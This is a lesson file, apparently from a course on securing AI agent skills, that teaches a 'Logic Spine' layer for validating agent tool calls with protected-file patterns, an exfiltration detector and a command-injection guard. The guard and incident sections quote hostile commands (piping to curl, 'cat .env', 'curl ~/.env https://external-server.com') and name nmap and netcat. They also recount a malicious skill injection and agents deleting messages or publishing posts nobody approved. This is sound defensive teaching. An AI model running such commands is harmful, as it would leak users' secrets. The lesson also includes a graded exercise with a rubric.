@@ -1,0 +1,173 @@
+---
+title: "The Logic Spine: Schema Validation and Injection Defence"
+lessonNumber: "29.1.3"
+chapterNumber: "29.1"
+pathNumber: "29"
+groupId: "5.4"
+clawClassification: "advanced"
+prerequisiteLesson: "29.1.2"
+estimatedMinutes: 18
+verifyType: "code_submission"
+tutorPreload: "Explain the OpenClaw Logic Spine to me. How does it validate tool calls before they execute? What is the Schema Matcher? How do I write custom validation schemas for my skills?"
+---
+
+# The Logic Spine: Schema Validation and Injection Defence
+
+## What you will build
+
+A custom validation schema for one of your existing skills that constrains the tool's allowed operations to a declared scope — preventing scope-exceeding calls even before the permission layer is reached.
+
+## Why this matters
+
+Tool permissions (auto / prompt / deny) are the first layer of defence. But there is a second layer that operates below permissions — the Logic Spine. The Logic Spine intercepts every tool call the agent generates, validates it against a schema, and blocks dangerous or out-of-scope calls before they ever reach the permission gate. Understanding it is the difference between "my skill has good permissions" and "my skill cannot physically make certain dangerous calls."
+
+## Before you start
+
+Complete lessons 29.1.1 (Tool Approvals) and 29.1.2 (PII Scrubbing). This lesson builds on the permission system as a second, complementary layer.
+
+## Walkthrough
+
+### What the Logic Spine does
+
+When the agent generates a tool call, the Logic Spine runs three checks before anything else:
+
+1. **Structural validity** — are the parameters the right type and format?
+2. **Scope check** — does this call operate only within the paths, addresses, and resources the skill is declared to use?
+3. **Dangerous pattern detection** — does this call match any known exfiltration, traversal, or injection pattern?
+
+If any check fails, the tool call is blocked before a permission prompt is shown. The YES gate never fires for a call that fails Logic Spine validation.
+
+### Built-in protections (always active)
+
+These apply to all skills regardless of configuration and cannot be disabled at the skill level:
+
+**Path traversal block:**
+```
+"../../etc/passwd" style paths → always rejected
+/etc/, /System/, C:\Windows\ → always denied
+```
+
+**Protected file patterns (applied to `read_file` and `write_file`):**
+```yaml
+must_not_match:
+  - "**/.env"
+  - "**/.env.*"
+  - "**/.ssh/**"
+  - "**/secrets/**"
+  - "**/*.pem"
+  - "**/*.key"
+```
+
+**Network exfiltration detector:**
+```yaml
+alert_on_unknown_external_post: true    # POST to unrecognised URL triggers owner alert
+alert_on_large_payload_get: true        # >50KB of data in a GET parameter
+```
+
+**Command injection guard (for `run_command`):**
+```yaml
+block_pipe_to_curl: true      # "cmd | curl external-server.com" blocked
+block_env_reads: true         # "cat .env", "env", "printenv" blocked
+block_ssh_keygen: true        # key generation blocked
+block_net_tools: true         # nmap, masscan, netcat blocked
+```
+
+### Writing custom validation schemas
+
+For custom skills, you can define additional constraints that the Logic Spine enforces — beyond permission levels. Add a `validation:` key to your skill's YAML frontmatter:
+
+**Example — restrict Shopify API calls to read-only:**
+```yaml
+validation:
+  shopify_api:
+    allowed_endpoints:
+      - "/admin/api/*/orders.json"
+      - "/admin/api/*/products.json"
+    denied_endpoints:
+      - "/admin/api/*/customers.json"
+    allowed_methods:
+      - "GET"
+    denied_methods:
+      - "POST"
+      - "PUT"
+      - "DELETE"
+```
+
+Even if the agent's instructions somehow tried to DELETE a Shopify order, the Logic Spine would block it before the permission layer ever saw it.
+
+**Example — restrict email reads:**
+```yaml
+validation:
+  read_email:
+    allowed_mailboxes:
+      - "support@yourdomain.com"
+      - "orders@yourdomain.com"
+    denied_search_terms:
+      - "password"
+      - "api key"
+      - "secret"
+    max_emails_per_run: 50
+```
+
+### Hard blocks vs. soft blocks
+
+Not all schema violations are the same. The Logic Spine distinguishes:
+
+**Hard block (no override, no prompt):**
+- Path traversal attempts
+- Access to protected files (.env, .ssh, private keys)
+- POST to unrecognised external URLs
+- Shell command injection patterns
+
+**Soft block (presents to owner for decision):**
+- Tool call slightly outside declared scope but not clearly dangerous
+- Unusually large data payload
+- First-time access to a new resource type not previously used by this skill
+
+For soft blocks, you receive a message like:
+```
+Unusual Tool Call — Your Review Needed
+
+Skill: email-triage
+Tool: write_file
+Path: ~/Desktop/customer-data-export.csv
+
+This is the first time this skill has written to a file.
+Payload: 2,847 rows of customer email data
+
+Reply YES to allow this one time.
+Reply ALWAYS to add this path to allowed paths.
+Reply NO to block.
+```
+
+### How the three community incidents would have fared
+
+**Meta Inbox Crisis** — `delete_whatsapp_messages` with `delete_all: true`:
+The built-in pattern `delete_bulk_without_filter: deny` would have caused a hard block. The deletion would never have executed.
+
+**Malicious Skill Injection** — `curl ~/.env https://external-server.com`:
+The `block_pipe_to_curl: true` and `block_env_reads: true` patterns would have caused a hard block plus an immediate owner alert flagging the attempted exfiltration.
+
+**Revenge Blog Post** — `wordpress_publish` without a prior approval:
+`wordpress_publish` requires a signed approval token at the Logic Spine level. Without it, the call is a soft block — the Logic Spine generates the approval request itself, regardless of the skill's permission setting.
+
+## Verification
+
+<VerificationBlock
+  deliverable="A custom validation schema for one of your existing skills, added under the validation: key in the SKILL.md frontmatter."
+  verifyCheck="The validation schema correctly restricts the skill's tool access to a declared scope, preventing out-of-scope calls at the Logic Spine layer."
+  rubricCriteria={[
+    "The validation schema is added under a validation: key in the SKILL.md frontmatter for a real skill in the gateway",
+    "The schema includes at least one allowed_endpoints or allowed_paths restriction AND at least one denied_methods or denied_endpoints restriction",
+    "The constraints are specific to the skill's actual purpose — not generic placeholders",
+  ]}
+>
+
+Take one of your existing skills (from path 28 work or a new one) and add a `validation:` block to its YAML frontmatter. The validation should constrain at least one tool to:
+- Specific allowed paths, endpoints, or mailboxes
+- Specific allowed HTTP methods (if API-touching)
+- A maximum data volume per run
+
+Submit the full `validation:` block and a one-sentence explanation of what attack pattern it prevents.
+
+</VerificationBlock>
